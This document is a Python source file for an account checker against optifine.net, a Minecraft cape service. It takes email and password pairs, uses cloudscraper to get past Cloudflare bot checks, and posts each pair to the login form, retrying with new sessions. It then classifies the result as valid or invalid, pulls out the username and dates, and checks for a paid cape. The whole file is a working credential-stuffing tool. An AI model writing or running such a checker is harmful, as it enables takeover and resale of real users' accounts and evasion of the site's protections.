import cloudscraper
import requests
from bs4 import BeautifulSoup
import re
import time
import logging

log = logging.getLogger(__name__)


class OptiFineChecker:
    LOGIN_URL = "https://optifine.net/login"
    CAPE_URL = "https://s.optifine.net/capes/{}.png"

    def __init__(self):
        self.scraper = None
        self._new_session()

    def _new_session(self):
        try:
            self.scraper = cloudscraper.create_scraper(
                browser={"browser": "chrome", "platform": "windows", "desktop": True},
                delay=5,
            )
            self.scraper.headers.update(
                {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                }
            )
        except Exception as e:
            log.error("cloudscraper init error: %s", e)
            self.scraper = requests.Session()

    def check_account(self, email: str, password: str) -> dict:
        result = {
            "status": "error",
            "cape": False,
            "username": None,
            "detail": "",
            "details": "",
        }

        for attempt in range(3):
            try:
                if attempt > 0:
                    self._new_session()
                    time.sleep(3)

                log.info("[%s] attempt %d", email, attempt + 1)

                # GET login page
                resp = self.scraper.get(
                    self.LOGIN_URL, timeout=30, allow_redirects=True
                )
                if resp.status_code != 200:
                    log.warning("[%s] GET status %d", email, resp.status_code)
                    continue

                html = resp.text
                if self._is_cloudflare(html):
                    log.warning("[%s] cloudflare on GET, retry", email)
                    time.sleep(5)
                    continue

                # parse form
                soup = BeautifulSoup(html, "html.parser")

                form = None
                for f in soup.find_all("form"):
                    if f.find("input", {"type": "password"}):
                        form = f
                        break
                if form is None:
                    form = soup.find("form")
                if form is None:
                    result["detail"] = "Login form not found on page"
                    continue

                action = form.get("action", "")
                if action and not action.startswith("http"):
                    if not action.startswith("/"):
                        action = "/" + action
                    action = "https://optifine.net" + action
                if not action:
                    action = self.LOGIN_URL

                # collect fields
                data = {}
                email_field = None
                pass_field = None

                for inp in form.find_all("input"):
                    name = inp.get("name")
                    if not name:
                        continue
                    itype = inp.get("type", "text").lower()
                    val = inp.get("value", "")

                    if itype == "password":
                        pass_field = name
                    elif itype == "hidden":
                        data[name] = val
                    elif itype == "submit":
                        data[name] = val if val else "Login"
                    elif itype in ("text", "email"):
                        email_field = name

                if not email_field:
                    for guess in ["email", "username", "user", "login", "j_username"]:
                        if form.find("input", {"name": guess}):
                            email_field = guess
                            break
                    else:
                        email_field = "email"

                if not pass_field:
                    for guess in ["password", "pass", "j_password", "passwd"]:
                        if form.find("input", {"name": guess}):
                            pass_field = guess
                            break
                    else:
                        pass_field = "password"

                data[email_field] = email
                data[pass_field] = password

                log.info(
                    "[%s] POST %s  fields=%s/%s", email, action, email_field, pass_field
                )

                # POST login
                self.scraper.headers["Referer"] = self.LOGIN_URL
                self.scraper.headers["Origin"] = "https://optifine.net"

                resp = self.scraper.post(
                    action, data=data, timeout=30, allow_redirects=True
                )
                log.info("[%s] response %d  url=%s", email, resp.status_code, resp.url)

                # analyze
                result.update(self._analyze(resp, email))

                # cape check
                username = result.get("username")
                if not username:
                    username = email.split("@")[0] if "@" in email else email
                result["cape"] = self._check_cape(username)

                return result

            except Exception as e:
                log.error("[%s] error attempt %d: %s", email, attempt + 1, e)
                result["detail"] = str(e)
                if attempt < 2:
                    time.sleep(3)

        return result

    def _analyze(self, resp, email: str) -> dict:
        html = resp.text
        url = resp.url.lower()
        soup = BeautifulSoup(html, "html.parser")

        if self._is_cloudflare(html):
            return {"status": "error", "detail": "Cloudflare blocked POST"}

        # redirect to account pages
        for marker in (
            "/profile", "/account", "/home", "/dashboard",
            "/cape", "/settings", "/donator",
        ):
            if marker in url:
                return {
                    "status": "valid",
                    "username": self._find_username(soup, html),
                    "detail": "Redirect -> " + resp.url,
                    "details": self._find_dates(html),
                }

        # logout link = logged in
        for a_tag in soup.find_all("a", href=True):
            href = a_tag.get("href", "").lower()
            txt = a_tag.get_text().lower().strip()
            if "logout" in href or "logout" in txt or "log out" in txt or "sign out" in txt:
                return {
                    "status": "valid",
                    "username": self._find_username(soup, html),
                    "detail": "Logout link found",
                    "details": self._find_dates(html),
                }

        # account words
        lower_html = html.lower()
        for word in (
            "my cape", "upload cape", "change cape", "your cape",
            "my account", "donator", "donation",
        ):
            if word in lower_html:
                return {
                    "status": "valid",
                    "username": self._find_username(soup, html),
                    "detail": "Account page: " + word,
                    "details": self._find_dates(html),
                }

        # welcome messages
        for pat in (
            r"welcome[,\s]+(\w+)",
            r"hello[,\s]+(\w+)",
            r"logged\s*in\s*as\s+(\w+)",
        ):
            m = re.search(pat, lower_html)
            if m:
                return {
                    "status": "valid",
                    "username": m.group(1),
                    "detail": "Welcome message",
                    "details": self._find_dates(html),
                }

        # error messages = invalid
        for word in (
            "invalid", "wrong", "incorrect", "error",
            "failed", "denied", "bad credentials", "try again",
        ):
            if word in lower_html:
                return {"status": "invalid", "detail": "Server: " + word}

        # still on login page
        if "/login" in url:
            if soup.find("input", {"type": "password"}):
                return {"status": "invalid", "detail": "Still on login page"}

        # redirected away from login
        if "/login" not in url and not soup.find("input", {"type": "password"}):
            return {
                "status": "valid",
                "username": self._find_username(soup, html),
                "detail": "Redirected to " + resp.url,
                "details": self._find_dates(html),
            }

        return {"status": "error", "detail": "Unknown response (%d)" % resp.status_code}

    @staticmethod
    def _find_username(soup, html: str):
        for pat in (
            r"(?:username|player|nickname)[:\s]+([A-Za-z0-9_]{3,16})",
            r"Minecraft\s+(?:Name|Username)[:\s]+([A-Za-z0-9_]{3,16})",
        ):
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    @staticmethod
    def _find_dates(html: str) -> str:
        for pat in (
            r"(?:last\s*login|registered|joined|created)[:\s]+([0-9/\-.\s:]+\d)",
            r"(\d{4}[-/]\d{2}[-/]\d{2}[\sT]?\d{0,2}:?\d{0,2})",
        ):
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return "Date: " + m.group(1).strip()
        return ""

    @staticmethod
    def _check_cape(username: str) -> bool:
        try:
            r = requests.get(
                OptiFineChecker.CAPE_URL.format(username), timeout=10
            )
            if r.status_code == 200:
                ct = r.headers.get("content-type", "")
                if "image" in ct or len(r.content) > 100:
                    log.info("Cape found for %s", username)
                    return True
        except Exception:
            pass
        return False

    @staticmethod
    def _is_cloudflare(html: str) -> bool:
        lower = html.lower()
        return any(
            x in lower
            for x in (
                "checking your browser",
                "cf-browser-verification",
                "just a moment",
                "enable javascript and cookies",
                "attention required",
            )
        )
